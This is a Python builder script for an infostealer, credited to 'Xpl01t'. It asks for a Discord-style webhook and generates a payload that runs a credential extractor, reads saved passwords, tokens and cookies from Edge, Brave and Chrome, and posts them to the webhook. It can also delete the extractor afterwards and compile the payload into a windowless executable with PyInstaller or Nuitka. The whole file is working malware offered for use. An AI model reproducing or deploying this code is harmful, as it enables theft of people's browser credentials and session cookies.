import requests
import os
import shutil
import time

def ascii_art():
    print(r"""
   ________                         ________                __             ______     __                  __           
  / ____/ /_  _________  ____ ___  / ____/ /__ _   ______ _/ /_____  _____/ ____/  __/ /__________ ______/ /____  _____
 / /   / __ \/ ___/ __ \/ __ `__ \/ /   / / _ \ | / / __ `/ __/ __ \/ ___/ __/ | |/_/ __/ ___/ __ `/ ___/ __/ _ \/ ___/
/ /___/ / / / /  / /_/ / / / / / / /___/ /  __/ |/ / /_/ / /_/ /_/ / /  / /____>  </ /_/ /  / /_/ / /__/ /_/  __/ /    
\____/_/ /_/_/   \____/_/ /_/ /_/\____/_/\___/|___/\__,_/\__/\____/_/  /_____/_/|_|\__/_/   \__,_/\___/\__/\___/_/     
                                                                                                                         
                                                                                                                     
                                                                                                                    
                            Made by Xpl01t    
                            https://github.com/Xpl01tDev                                                                                       
""")

def cls_ascii():
    os.system("cls")
    ascii_art()

cls_ascii()

WEBHOOK = input("What's your webhook link? ")
FILENAME = input("How is your .exe called? (With .exe after it) ")
FILENAMEAFTER = input("How do you want to call your compiled .exe file? ")
COMPILEMETHOD = input("Do you want to compile in pyinstaller or nuitka? (Use p/n) ")

def create_file_no_des():

 with open("payload.py", "w") as file:
     file.write(fr"""
import requests
import shutil
import os

BROWSERS = [
    "Edge",
    "Brave",
    "Chrome",
]

EXTRACTIONS = [
    "passwords.json",
    "tokens.json",
    "cookies.json"
]

WEBHOOK = "{WEBHOOK}"

os.system("{FILENAME} all")

def check_browser():

    for browsers in BROWSERS:
        if os.path.isdir(f"output/{{browsers}}"):
            print("Found", browsers)

            for extraction in EXTRACTIONS:
                path = fr"output/{{browsers}}/Default/{{extraction}}"
                if os.path.isfile(path):
                    with open(path, "r") as file:
                        content = file.read()
                    data = {{
                        "content": content
                    }}
                    response = requests.post(WEBHOOK, json=data)

check_browser()  


""")

def create_file_des():
   with open("payload.py", "w") as file:
        file.write(fr"""
import requests
import shutil
import os
   
BROWSERS = [
    "Edge",
    "Brave",
    "Chrome",
]

EXTRACTIONS = [
    "passwords.json",
    "tokens.json",
    "cookies.json"
]

WEBHOOK = "{WEBHOOK}"
   
os.system("{FILENAME} all")
   
def check_browser():

    for browsers in BROWSERS:
        if os.path.isdir(f"output/{{browsers}}"):
            print("Found", browsers)

            for extraction in EXTRACTIONS:
                path = fr"output/{{browsers}}/Default/{{extraction}}"
                if os.path.isfile(path):
                    with open(path, "r") as file:
                        content = file.read()
                    data = {{
                        "content": content
                    }}
                    response = requests.post(WEBHOOK, json=data)

check_browser()  
   
os.remove("{FILENAME}")
   
   
""")

while True:

 DESTRUCTION = input("Do you want self destruction on the payload's? y/n ")

 if DESTRUCTION == "y":
    create_file_des()
    print("Okay file created without self destruction!")
    break
 elif DESTRUCTION == "n":
    create_file_no_des()
    print("Okay file created with no self destruction!")
    break
 else:
    print("Command not recognised try again.")
 

while True:
   
   if COMPILEMETHOD == "p":
      os.system(f"pyinstaller --onefile --noconsole payload.py")
      print("Compiling with pyinstaller")
      break
   elif COMPILEMETHOD == "n":
      os.system(f"python -m nuitka payload.py --standalone --onefile --mingw64 --lto=yes --output-filename={FILENAMEAFTER}")
      print("compiling with nuitka")
      break
   else:
      print("Command not recognised")